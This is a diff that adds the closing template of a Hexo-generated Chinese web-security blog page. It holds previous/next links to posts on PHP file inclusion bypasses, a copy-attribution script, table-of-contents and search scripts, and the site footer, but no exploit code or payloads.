+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/03/18/PHP-File-Inclusion-Exploiting-and-Bypass/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/code-2.jpg" class="responsive-img" alt="PHP File Inclusion Bug Exploiting and Bypass Handbook">
+                        
+                        <span class="card-title">PHP File Inclusion Bug Exploiting and Bypass Handbook</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            PHP File Inclusion Bug Exploiting and Bypass Handbook 这个手册主要是记录针对PHP文件包含漏洞的利用思路与Bypass手法的总结。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Handbook/">
+                        <span class="chip bg-color">Handbook</span>
+                    </a>
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/LFI/">
+                        <span class="chip bg-color">LFI</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                    <a href="/tags/RFI/">
+                        <span class="chip bg-color">RFI</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/03/12/LFI-Bypass-Session-Restriction-Getshell/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/bypass-1.jpg" class="responsive-img" alt="LFI Bypass Session Restriction Getshell">
+                        
+                        <span class="card-title">LFI Bypass Session Restriction Getshell</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            之前打CTF和挖洞的时候遇到过不少服务器本地文件包含Session的漏洞，不过几乎这种Session包含漏洞都会有一些限制的，需要结合一些特殊的技巧去Bypass，于是打算整理一下关于PHP LFI绕过Session包含限制Getshell的一些奇思妙想。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-12
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                    <a href="/tags/LFI/">
+                        <span class="chip bg-color">LFI</span>
+                    </a>
+                    
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
